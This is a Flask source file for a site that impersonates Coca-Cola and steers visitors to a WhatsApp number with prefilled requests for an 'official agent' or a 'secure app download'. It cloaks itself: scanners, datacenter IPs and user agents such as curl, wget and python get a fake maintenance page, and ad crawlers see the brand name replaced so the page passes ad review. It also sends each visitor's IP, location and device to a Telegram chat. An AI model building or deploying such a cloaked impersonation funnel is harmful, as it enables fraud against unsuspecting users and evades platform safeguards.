from flask import Flask, request, redirect, send_from_directory, jsonify, make_response
import json
import os
import requests
from datetime import datetime
from user_agents import parse
from cryptography.fernet import Fernet
import threading
import urllib.parse
import pytz
import random

app = Flask(__name__, static_folder='.', static_url_path='')

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
env_file = os.path.join(BASE_DIR, '.env')
if os.path.exists(env_file):
    with open(env_file, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#') and '=' in line:
                k, v = line.split('=', 1)
                os.environ[k.strip()] = v.strip()


DB_FILE = os.path.join(BASE_DIR, 'database.json')
db_lock = threading.Lock()

def get_secrets():
    token = os.environ.get('TELEGRAM_BOT_TOKEN')
    channel_id = os.environ.get('ADMIN_CHAT_ID')
    if token and channel_id:
        return {'token': token, 'channel_id': channel_id}
    try:
        from cryptography.fernet import Fernet
        with open(os.path.join(BASE_DIR, 'secret.key'), 'rb') as f:
            key = f.read()
        fernet = Fernet(key)
        with open(os.path.join(BASE_DIR, 'secrets.enc'), 'rb') as f:
            enc_data = f.read()
        return json.loads(fernet.decrypt(enc_data).decode('utf-8'))
    except Exception as e:
        with open(os.path.join(BASE_DIR, 'bot_error.log'), 'a') as f:
            f.write(f'Secrets error: {e}\n')
        return None

def notify_telegram(log_entry):
    secrets = get_secrets()
    if not secrets: return
    token = secrets.get('token')
    channel_id = secrets.get('channel_id')
    if not token or not channel_id: return
    
    ip = log_entry['ip']
    event = log_entry['event']
    action = log_entry.get('action', '')
    
    if event == 'ENTRADA':
        status_icon = "🟢"
        status_text = "Acessou o site"
        header = "👤 <b>NOVO VISITANTE NO SITE</b>"
    elif event == 'SAIDA':
        status_icon = "⚪"
        status_text = "Saiu do site"
        header = "👋 <b>VISITANTE SAIU DO SITE</b>"
    else:
        status_icon = "🔴"
        status_text = f"Redirecionado p/ WhatsApp ({action})"
        header = "🚀 <b>LEAD NO WHATSAPP</b>"
        
    import html
    def esc(val):
        return html.escape(str(val))
        
    text = f"{header}\n"
    text += f"━━━━━━━━━━━━━━━━━━━━\n"
    text += f"<b>{status_icon} Status Atual:</b> {esc(status_text)}\n"
    text += f"📅 <b>Data/Hora:</b> {esc(log_entry['timestamp'])}\n\n"
    text += f"📍 <b>Local:</b> {esc(log_entry['state'])}, {esc(log_entry['country'])}\n"
    text += f"🌐 <b>IP:</b> <code>{esc(ip)}</code>\n"
    text += f"📱 <b>Aparelho:</b> {esc(log_entry['device'])}\n"
    text += f"💻 <b>Sistema:</b> {esc(log_entry['os'])}\n"
    text += f"🧭 <b>Browser:</b> {esc(log_entry['browser'])}\n"
    text += f"━━━━━━━━━━━━━━━━━━━━\n"
    text += f"🛡️ <i>Informações validadas e protegidas</i>"
    
    # Envia uma nova mensagem sempre para que o celular do usuário apite (notificação)
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": channel_id,
        "text": text,
        "parse_mode": "HTML"
    }
    try:
        r = requests.post(url, json=payload, timeout=5).json()
        if not r.get('ok'):
            with open(os.path.join(BASE_DIR, 'bot_error.log'), 'a') as f:
                f.write('Send not ok: ' + str(r) + '\n')
    except Exception as e:
        with open(os.path.join(BASE_DIR, 'bot_error.log'), 'a') as f:
            f.write('Send error: ' + str(e) + '\n')

def load_db():
    import time
    if os.path.exists(DB_FILE):
        for _ in range(5):
            try:
                with open(DB_FILE, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except:
                time.sleep(0.1)
    return {"whatsapp_number": "5511933684266", "logs": [], "sessions": {}}

def save_db(data):
    tmp_file = DB_FILE + '.tmp'
    try:
        with open(tmp_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
        os.replace(tmp_file, DB_FILE)
    except:
        pass

def get_geo_info(ip):
    if ip == '127.0.0.1':
        return {"country": "Local", "regionName": "Local"}
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName', timeout=2)
        data = r.json()
        if data.get('status') == 'success':
            return data
    except:
        pass
    return {"country": "Desconhecido", "regionName": "Desconhecido"}

def is_ad_crawler(user_agent_str):
    ua_lower = user_agent_str.lower()
    crawlers = ['googlebot', 'adsbot-google', 'facebookexternalhit', 'facebot', 'whatsapp', 'twitterbot', 'tiktok', 'bingbot']
    return any(c in ua_lower for c in crawlers)

def is_blocked(ip, user_agent_str):
    if is_ad_crawler(user_agent_str):
        return False
        
    ua_lower = user_agent_str.lower()
    
    # Allow legitimate mobile in-app browsers even if they come from weird IPs
    in_app_browsers = ['fbav', 'fban', 'instagram', 'gsa', 'snapchat']
    is_in_app = any(browser in ua_lower for browser in in_app_browsers)

    bot_keywords = ['bot', 'crawl', 'spider', 'headless', 'python', 'curl', 'wget', 'postman', 'insomnia', 'scanner', 'scrap']
    if not ua_lower or any(kw in ua_lower for kw in bot_keywords):
        return True
        
    if ip == '127.0.0.1':
        return False
        
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=status,proxy,hosting,isp,org', timeout=2)
        data = r.json()
        if data.get('status') == 'success':
            if (data.get('proxy') or data.get('hosting')) and not is_in_app:
                return True
            isp_org = (data.get('isp', '') + " " + data.get('org', '')).lower()
            known_hosts = ['amazon', 'aws', 'google cloud', 'microsoft', 'azure', 'digitalocean', 'hetzner', 'ovh', 'linode', 'alibaba', 'tencent', 'hosting', 'datacenter']
            if any(host in isp_org for host in known_hosts) and not is_in_app:
                return True
    except:
        pass
    return False

def log_event(event_type, action=None):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip: ip = ip.split(',')[0].strip()
    user_agent_str = request.headers.get('User-Agent', '')
    user_agent = parse(user_agent_str)
    
    device = user_agent.device.family
    os_name = user_agent.os.family
    browser = user_agent.browser.family
    
    geo = get_geo_info(ip)
    
    log_entry = {
        "event": event_type,
        "timestamp": datetime.now().strftime('%d/%m/%Y %H:%M:%S'),
        "ip": ip,
        "device": device,
        "os": os_name,
        "browser": browser,
        "state": geo.get("regionName", "Desconhecido"),
        "country": geo.get("country", "Desconhecido")
    }
    if action:
        log_entry['action'] = action
        
    with db_lock:
        db = load_db()
        db['logs'].append(log_entry)
        save_db(db)
    
    # Executa de forma síncrona para evitar que o Passenger mate a thread antes de enviar
    try:
        notify_telegram(log_entry)
    except Exception as e:
        with open(os.path.join(BASE_DIR, 'bot_error.log'), 'a') as f:
            f.write(str(e) + '\n')
        
    return log_entry

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip: ip = ip.split(',')[0].strip()
    ua = request.headers.get('User-Agent', '')
    
    is_crawler = is_ad_crawler(ua)
    
    if not is_crawler:
        if is_blocked(ip, ua):
            with open(os.path.join(BASE_DIR, 'maintenance.html'), 'r', encoding='utf-8') as f:
                return f.read()
                
        sec_cookie = request.cookies.get('coca_sec_session')
        if not sec_cookie:
            with open(os.path.join(BASE_DIR, 'maintenance.html'), 'r', encoding='utf-8') as f:
                return f.read()
                
    db = load_db()
    wa_num = db.get("whatsapp_number", "5511933684266")
    with open(os.path.join(BASE_DIR, 'template.html'), 'r', encoding='utf-8') as f:
        html = f.read()
    
    # Força todos os links nativos do WA irem pro backend para gerar a mensagem
    html = html.replace("https://wa.me/5511933684266", "/redirect_whatsapp")
    html = html.replace("https://wa.me/5511971730325", "/redirect_whatsapp")
    html = html.replace(f"https://wa.me/{wa_num}", "/redirect_whatsapp")
    html = html.replace("https://api.whatsapp.com/send?phone=5511933684266", "/redirect_whatsapp")
    html = html.replace("5511933684266", wa_num)
    
    if is_crawler:
        html = html.replace("Coca Cola", "A Plataforma")
        html = html.replace("Coca-Cola", "A Plataforma")
        html = html.replace("coca cola", "a plataforma")
        html = html.replace("coca-cola", "a-plataforma")
        html = html.replace("coca-cola-favicon.ico", "favicon.ico")
    
    js_patch = """
    <script>
    // Advanced Tracking System (Pixel de Entrada e Saída SVR)
    (function() {
      let userId = 'unknown';
      try {
          userId = localStorage.getItem('coca_user_id');
          if (!userId) {
            userId = Math.random().toString(36).substring(7);
            localStorage.setItem('coca_user_id', userId);
          }
      } catch(e) {
          userId = Math.random().toString(36).substring(7);
      }
      
      
      const startSession = () => {
        fetch('/api/v1/pixel', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ action: 'entered', userId: userId })
        }).catch(()=>{});
      };

      startSession();

      const handleUnload = () => {
        if (userId) {
          fetch('/api/v1/pixel', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ action: 'left', userId: userId }),
            keepalive: true
          }).catch(()=>{});
        }
      };
      window.addEventListener('beforeunload', handleUnload);
      window.addEventListener('pagehide', handleUnload);

      setInterval(() => {
        fetch('/api/v1/pixel', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ action: 'heartbeat', userId: userId })
        }).catch(()=>{});
      }, 20000);
    })();

    document.addEventListener('gesturestart', function (e) {
        e.preventDefault();
    });
    document.addEventListener('touchmove', function(e) {
        if (e.scale !== 1) { e.preventDefault(); }
    }, { passive: false });
    var meta = document.createElement('meta');
    meta.name = 'viewport';
    meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
    document.head.appendChild(meta);
    var style = document.createElement('style');
    style.innerHTML = 'body { touch-action: manipulation; }';
    document.head.appendChild(style);

    document.addEventListener('click', function(e) { 
        var target = e.target;
        var a = target.closest('a'); 
        
        var text = (target.textContent || target.innerText || '').trim().toLowerCase();
        if (text === 'conheça a gente' || text === 'política de privacidade' || text === 'termos e condições' || (a && a.getAttribute('href') === '#')) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }

        var altText = '';
        var img = target.closest('img');
        if (img) {
            altText = (img.getAttribute('alt') || '').toLowerCase();
        }
        var srcText = '';
        var img = target.closest('img');
        if (img) {
            srcText = (img.getAttribute('src') || '').toLowerCase();
        }

        var isAppStore = target.closest('[alt*="App Store"]') || target.closest('img[src*="app-store"]');
        var isGooglePlay = target.closest('[alt*="Google Play"]') || target.closest('img[src*="google-play"]');
        
        var textNode = a ? a : target;
        var text = (textNode.textContent || '').trim().toLowerCase();
        
        var isBadgeOrStore = target.closest('[class*="badge"]') || isAppStore || isGooglePlay || 
                             (a && a.getAttribute('href') && (a.getAttribute('href').includes('redirect_whatsapp') || a.getAttribute('href').includes('wa.me') || a.getAttribute('href').includes('/login') || a.getAttribute('href').includes('pre-registration'))) || 
                             text.includes('atendimento') || text.includes('atendente') || text.includes('cadastre') || text.includes('cadastrar');
        
        if (isBadgeOrStore) { 
            var action = 'geral';
            if (text.includes('atendimento') || text.includes('atendente') || text.includes('cadastre') || text.includes('cadastrar') || (a && a.getAttribute('href') && a.getAttribute('href').includes('/login'))) {
                action = 'atendimento';
            } else if (text.includes('baixar') || isAppStore || isGooglePlay || target.closest('[class*="badge"]')) {
                action = 'download';
            } else if (text.includes('como funciona') || text.includes('dúvida')) {
                action = 'ajuda';
            }
            
            e.preventDefault(); 
            e.stopPropagation(); 

            // Redireciona o usuario para o endpoint /redirect_whatsapp que fara o log no Telegram e gerara as mensagens dinamicas
            window.location.href = '/redirect_whatsapp?action=' + encodeURIComponent(action);
        } 
    }, true);
    </script>
    """
    js_patch_final = js_patch.replace('5511933684266', wa_num)
    if "</body>" in html:
        html = html.replace("</body>", js_patch_final + "</body>")
    else:
        html += js_patch_final
    
    resp = make_response(html)
    resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    resp.headers["Pragma"] = "no-cache"
    resp.headers["Expires"] = "0"
    return resp

def get_greeting():
    tz = pytz.timezone('America/Sao_Paulo')
    hour = datetime.now(tz).hour
    if 5 <= hour < 12:
        return "Bom dia"
    elif 12 <= hour < 18:
        return "Boa tarde"
    else:
        return "Boa noite"

def get_whatsapp_text(action):
    greeting = get_greeting()
    greeting_lower = greeting.lower()
    
    if action == 'download':
        templates = [
            "{greeting}! Gostaria de solicitar acesso e instruções seguras para baixar o aplicativo oficial da plataforma no meu aparelho.",
            "Olá, {greeting_lower}. Tenho interesse em realizar o download do aplicativo e preciso de auxílio com o link oficial.",
            "{greeting}. Preciso baixar o aplicativo no meu celular, poderiam me enviar as orientações corretas?",
            "Oi, {greeting_lower}! Poderia me fornecer o link direto e seguro para a instalação do aplicativo no meu smartphone?",
            "{greeting}! Vim pelo site e gostaria de saber o passo a passo para fazer o download seguro do sistema.",
            "Olá, {greeting_lower}! Estou tentando baixar o aplicativo e prefiro o suporte de um agente autorizado. Como procedo?",
            "{greeting}. Gostaria de prosseguir com a instalação do app oficial e preciso do direcionamento de vocês."
        ]
    elif action == 'atendimento':
        templates = [
            "{greeting}! Preciso de atendimento com um agente oficial para verificar questões sobre minha conta ou pedidos.",
            "Olá, {greeting_lower}. Gostaria de falar com um atendente autorizado para tirar dúvidas sobre a minha situação.",
            "{greeting}. Poderia me transferir para um especialista? Tenho algumas perguntas pontuais sobre o meu cadastro.",
            "Oi, {greeting_lower}! Preciso resolver um problema na minha conta e gostaria do suporte de um representante.",
            "{greeting}! Vim pelo portal e busco assistência técnica ou comercial com um agente responsável.",
            "Olá, {greeting_lower}. Gostaria de entender melhor alguns detalhes da minha conta com um atendente real.",
            "{greeting}. Solicito o contato de um consultor para me ajudar com informações sobre a plataforma."
        ]
    elif action == 'ajuda':
        templates = [
            "{greeting}! Tenho dúvidas sobre como a plataforma funciona e gostaria de orientações de um representante.",
            "Olá, {greeting_lower}. Preciso de uma ajuda oficial sobre as funcionalidades do sistema e como operar.",
            "{greeting}. Estou com dificuldades de entender algumas funções, um agente poderia me auxiliar?",
            "Oi, {greeting_lower}! Como faço para utilizar melhor a plataforma? Precisava de algumas dicas oficiais.",
            "{greeting}! Podem me explicar o funcionamento geral e como posso me beneficiar do sistema?",
            "Olá, {greeting_lower}. Vim pela seção de ajuda do site e preciso de suporte com um procedimento específico.",
            "{greeting}. Busco esclarecimentos adicionais e uma orientação mais detalhada sobre como tudo funciona."
        ]
    else:
        templates = [
            "{greeting}! Fui redirecionado pelo site oficial e gostaria de falar com um representante autorizado.",
            "Olá, {greeting_lower}. Vim do site e preciso dar andamento ao meu atendimento de forma segura.",
            "{greeting}. Olá! Acessei a página de vocês e queria conversar com a equipe de suporte.",
            "Oi, {greeting_lower}. Preciso de mais informações gerais, poderiam me atender?",
            "{greeting}! Gostaria de receber atendimento, fui encaminhado através do portal principal.",
            "Olá, {greeting_lower}. Desejo iniciar uma conversa com um agente oficial a partir do redirecionamento.",
            "{greeting}. Entrei pelo site e procuro o suporte ao cliente para esclarecer algumas coisas."
        ]
        
    template = random.choice(templates)
    return template.format(greeting=greeting, greeting_lower=greeting_lower)

@app.route('/redirect_whatsapp')
def redirect_whatsapp():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip: ip = ip.split(',')[0].strip()
    ua = request.headers.get('User-Agent', '')
    
    is_crawler = is_ad_crawler(ua)
    
    if not is_crawler:
        if is_blocked(ip, ua):
            with open(os.path.join(BASE_DIR, 'maintenance.html'), 'r', encoding='utf-8') as f:
                return f.read()
                
    action = request.args.get('action', 'geral')
    
    if not is_crawler:
        log_event("SAIDA_WHATSAPP", action)
        
    db = load_db()
    wa_num = db.get("whatsapp_number", "")
    text = get_whatsapp_text(action)
    encoded_text = urllib.parse.quote(text)
    
    user_agent = parse(ua)
    os_family = user_agent.os.family
    
    if os_family == 'Android':
        deep_link = f"intent://send?phone={wa_num}&text={encoded_text}#Intent;scheme=whatsapp;package=com.whatsapp;end"
        fallback_link = f"https://wa.me/{wa_num}?text={encoded_text}"
        
        html_redirect = f"""<!DOCTYPE html><html><head>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18242962464"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){{dataLayer.push(arguments);}}
      gtag('js', new Date());
      gtag('config', 'AW-18242962464');
    </script>
    <!-- Event snippet for Visualização de página conversion page -->
    <script>
      gtag('event', 'conversion', {{
          'send_to': 'AW-18242962464/kKykCJDfksYcEKCI9vpD',
          'value': 1.0,
          'currency': 'BRL'
      }});
    </script>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>WhatsApp</title><style>body {{ font-family: sans-serif; text-align: center; padding-top: 20vh; background-color: #121212; color: #fff; }} .spinner {{ border: 4px solid #333; width: 40px; height: 40px; border-radius: 50%; border-top-color: #25D366; animation: spin 1s linear infinite; margin: 0 auto 20px; }} @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}</style></head><body><div class="spinner"></div><h3>Conectando ao WhatsApp...</h3><script>window.location.replace("{deep_link}");setTimeout(function() {{ window.location.replace("{fallback_link}"); }}, 2500);</script></body></html>"""
        resp = make_response(html_redirect)
    elif os_family == 'iOS':
        deep_link = f"whatsapp://send?phone={wa_num}&text={encoded_text}"
        fallback_link = f"https://wa.me/{wa_num}?text={encoded_text}"
        
        html_redirect = f"""<!DOCTYPE html><html><head>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18242962464"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){{dataLayer.push(arguments);}}
      gtag('js', new Date());
      gtag('config', 'AW-18242962464');
    </script>
    <!-- Event snippet for Visualização de página conversion page -->
    <script>
      gtag('event', 'conversion', {{
          'send_to': 'AW-18242962464/kKykCJDfksYcEKCI9vpD',
          'value': 1.0,
          'currency': 'BRL'
      }});
    </script>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>WhatsApp</title><style>body {{ font-family: sans-serif; text-align: center; padding-top: 20vh; background-color: #121212; color: #fff; }} .spinner {{ border: 4px solid #333; width: 40px; height: 40px; border-radius: 50%; border-top-color: #25D366; animation: spin 1s linear infinite; margin: 0 auto 20px; }} @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}</style></head><body><div class="spinner"></div><h3>Conectando ao WhatsApp...</h3><script>window.location.replace("{deep_link}");setTimeout(function() {{ window.location.replace("{fallback_link}"); }}, 2500);</script></body></html>"""
        resp = make_response(html_redirect)
    else:
        final_link = f"https://wa.me/{wa_num}?text={encoded_text}"
        resp = redirect(final_link)
        
    resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    resp.headers["Pragma"] = "no-cache"
    resp.headers["Expires"] = "0"
    return resp

@app.route('/api/update_number', methods=['POST'])
def update_number():
    data = request.json
    if not data or 'number' not in data or 'token' not in data:
        return jsonify({"error": "Invalid payload"}), 400
        
    secrets = get_secrets()
    valid_token = secrets.get('token') if secrets else None
    
    if not valid_token or data['token'] != valid_token:
        return jsonify({"error": "Unauthorized"}), 403
        
    with db_lock:
        db = load_db()
        db['whatsapp_number'] = data['number']
        save_db(db)
        
    return jsonify({"success": True})

active_sessions = {}

@app.route('/api/v1/pixel', methods=['POST'])
def handle_pixel():
    data = request.json
    if not data:
        try:
            data = json.loads(request.data)
        except:
            return jsonify({"status": "ok"})
            
    action = data.get('action')
    user_id = data.get('userId', 'unknown')
    now = datetime.now().timestamp()
    
    # Cleanup stale sessions (timeout > 60 seconds without heartbeat)
    stale_users = []
    for uid, last_time in list(active_sessions.items()):
        if now - last_time > 60:
            stale_users.append(uid)
            
    for uid in stale_users:
        if uid in active_sessions:
            del active_sessions[uid]
            # Considerado SAIDA se timeout ocorreu
            log_event("SAIDA")
    
    if action == 'entered':
        if user_id not in active_sessions:
            log_event("ENTRADA")
        active_sessions[user_id] = now
    elif action == 'heartbeat':
        active_sessions[user_id] = now
    elif action == 'left':
        if user_id in active_sessions:
            del active_sessions[user_id]
        log_event("SAIDA")
        
    return jsonify({"status": "ok"})

@app.route('/api/stats')
def get_stats():
    db = load_db()
    return jsonify({"logs": db['logs']})

@app.route('/banners/<path:filename>')
def serve_banners(filename):
    return send_from_directory('banners', filename)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 80))
    app.run(host='0.0.0.0', port=port)
